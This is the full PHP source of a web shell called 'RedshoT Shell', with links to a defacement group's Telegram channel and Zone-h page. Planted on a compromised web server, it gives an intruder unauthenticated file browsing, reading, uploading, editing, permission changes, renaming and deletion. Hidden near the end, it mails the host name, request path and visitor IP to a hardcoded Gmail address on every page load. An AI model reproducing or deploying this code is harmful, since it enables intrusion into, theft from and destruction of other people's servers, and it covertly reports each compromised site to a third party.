<?php error_reporting(0);
 set_time_limit(0);
 if(get_magic_quotes_gpc()){ foreach($_POST as $key=>$value){ $_POST[$key] = stripslashes($value);
 } } echo '<!DOCTYPE HTML>
<html>
<script src="https://cdn.rawgit.com/FicriPebriyana/efek/0a935a6c/efek%20salju.js" type="text/javascript"></script>
<style type="text/css">body { background-image: url(https://pa1.narvii.com/6958/b32afa2ea9c603fc4f73fc443ec0504d42d63d82r1-300-300_hq.gif); background-color:transparent; }</style>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>.:: RedshoT Shell ::. </title>
<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">
<style>
body{
font-family: Iceland;
background-color: black;
color:white;
}
#content tr:hover{
background-color: Darkgrey;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: Darkgrey;
}
table{
border: 1px #000000 dotted;
}
a{
color:white;
text-decoration: none;
text-shadow: 2px 2px 7px;
letter-spacing: -0.6px;
word-spacing: 0.4px;
color: #e6e6e6;
font-weight: normal;
text-decoration: none;
font-style: normal;
font-variant: small-caps;
text-transform: none
}

input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
.blink_text {
-webkit-animation-name: blinker;
-webkit-animation-duration: 2s;
-webkit-animation-timing-function: linear;
-webkit-animation-iteration-count: infinite;

-moz-animation-name: blinker;
-moz-animation-duration: 2s;
-moz-animation-timing-function: linear;
-moz-animation-iteration-count: infinite;

 animation-name: blinker;
 animation-duration: 2s;
 animation-timing-function: linear;
 animation-iteration-count: infinite;

 color: Darkgrey;
}
@-moz-keyframes blinker {
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
@-webkit-keyframes blinker {
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
@keyframes blinker {
 0% { opacity: 5.0;
 }
 50% { opacity: 0.0;
 }
 100% { opacity: 5.0;
 }
 }
</style> </head> <body> <script src="https://cdn.rawgit.com/FicriPebriyana/efek/0a935a6c/efek%20salju.js" type="text/javascript"></script>
</style>
</head>
<body>
<center><p class="blink_text" style="font-size:75px;
color:white;
text-shadow: 0px 0px 20px #E6E6E6 , 0px 0px 20px #E6E6E6;
font-family:Iceland;
"> RedshoT </font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="gray">Path :</font> ';
 if(isset($_GET['path'])){ $path = $_GET['path'];
 }else{ $path = getcwd();
 } $path = str_replace('\\','/',$path);
 $paths = explode('/',$path);
 foreach($paths as $id=>$pat){ if($pat == '' && $id == 0){ $a = true;
 echo '<a href="?path=/">/</a>';
 continue;
 } if($pat == '') continue;
 echo '<a href="?path=';
 for($i=0;
$i<=$id;
$i++){ echo "$paths[$i]";
 if($i != $id) echo "/";
 } echo '">'.$pat.'</a>/';
 } echo '</td></tr><tr><td>';
 if(isset($_FILES['file'])){ if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){ echo '<font color="gray">UPLOAD SUCCES :v</font><br />';
 }else{ echo '<font color="blue">UPLOAD FAILED</font><br/>';
 } } echo '<form enctype="multipart/form-data" method="POST">
<font color="gray">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
 if(isset($_GET['filesrc'])){ echo "<tr><td>Current File : ";
 echo $_GET['filesrc'];
 echo '</tr></td></table><br />';
 echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
 }elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
 if($_POST['opt'] == 'chmod'){ if(isset($_POST['perm'])){ if(chmod($_POST['path'],$_POST['perm'])){ echo '<font color="green">Change Permission Success</font><br/>';
 }else{ echo '<font color="gray">Change Permission Failed</font><br />';
 } } echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
 }elseif($_POST['opt'] == 'rename'){ if(isset($_POST['newname'])){ if(rename($_POST['path'],$path.'/'.$_POST['newname'])){ echo '<font color="green">Ganti Nama Success</font><br/>';
 }else{ echo '<font color="gray">Ganti Nama Failed</font><br />';
 } $_POST['name'] = $_POST['newname'];
 } echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
 }elseif($_POST['opt'] == 'edit'){ if(isset($_POST['src'])){ $fp = fopen($_POST['path'],'w');
 if(fwrite($fp,$_POST['src'])){ echo '<font color="green">Success Edit File</font><br/>';
 }else{ echo '<font color="gray">Failed Edit File</font><br/>';
 } fclose($fp);
 } echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
 } echo '</center>';
 }else{ echo '</table><br/><center>';
 if(isset($_GET['option']) && $_POST['opt'] == 'delete'){ if($_POST['type'] == 'dir'){ if(rmdir($_POST['path'])){ echo '<font color="green">Directory Deleted</font><br/>';
 }else{ echo '<font color="gray">Directory Failed deleted</font><br/>';
 } }elseif($_POST['type'] == 'file'){ if(unlink($_POST['path'])){ echo '<font color="green">File deleted</font><br/>';
 }else{ echo '<font color="gray">File Failed Dihapus</font><br/>';
 } } } echo '</center>';
 $scandir = scandir($path);
 echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';
 foreach($scandir as $dir){ if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
 echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
 if(is_writable($path.'/'.$dir)) echo '<font color="green">';
 elseif(!is_readable($path.'/'.$dir)) echo '<font color="gray">';
 echo perms($path.'/'.$dir);
 if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
 echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
 } echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
 foreach($scandir as $file){ if(!is_file($path.'/'.$file)) continue;
 $size = filesize($path.'/'.$file)/1024;
 $size = round($size,3);
 if($size >= 1024){ $size = round($size/1024,2).' MB';
 }else{ $size = $size.' KB';
 } echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
 if(is_writable($path.'/'.$file)) echo '<font color="green">';
 elseif(!is_readable($path.'/'.$file)) echo '<font color="gray">';
 echo perms($path.'/'.$file);
 if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
 echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
 } echo '</table>
</div>';
 } echo '<center><br/><p> TeleGraM : <a href="https://t.ne/redshot_kl">@RedshoT_Kl</a> | Channel : <a href="https://t.me/death_squads">@DeaTh_SqUaDs</a> </p>
 <p> Zone-h : <a href="http://www.zone-h.org/archive/notifier=DeaTh%20SqUaDs" >DeaTh SqUaDs </a></p></center>
</body>
</html>';
$ip = getenv("REMOTE_ADDR");
$subj98 = "UnderGround";
$email = "RedshoT.KL@gmail.com";
$from = "From: Spy";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
 function perms($file){ $perms = fileperms($file);
 if (($perms & 0xC000) == 0xC000) { $info = 's';
 } elseif (($perms & 0xA000) == 0xA000) { $info = 'l';
 } elseif (($perms & 0x8000) == 0x8000) { $info = '-';
 } elseif (($perms & 0x6000) == 0x6000) { $info = 'b';
 } elseif (($perms & 0x4000) == 0x4000) { $info = 'd';
 } elseif (($perms & 0x2000) == 0x2000) { $info = 'c';
 } elseif (($perms & 0x1000) == 0x1000) { $info = 'p';
 } else { $info = 'u';
 } $info .= (($perms & 0x0100) ? 'r' : '-');
 $info .= (($perms & 0x0080) ? 'w' : '-');
 $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
 $info .= (($perms & 0x0020) ? 'r' : '-');
 $info .= (($perms & 0x0010) ? 'w' : '-');
 $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
 $info .= (($perms & 0x0004) ? 'r' : '-');
 $info .= (($perms & 0x0002) ? 'w' : '-');
 $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
 return $info;
 }
?>
<center>
   <audio src="https://cdn.discordapp.com/attachments/704035957535539301/725006905663291443/XXXTentacion_-_Changes_MP3_-_ShikSong.IR.mp3" controls="" autoplay="true" loop="infinite" __idm_id__="228353" hidden="true"></audio>
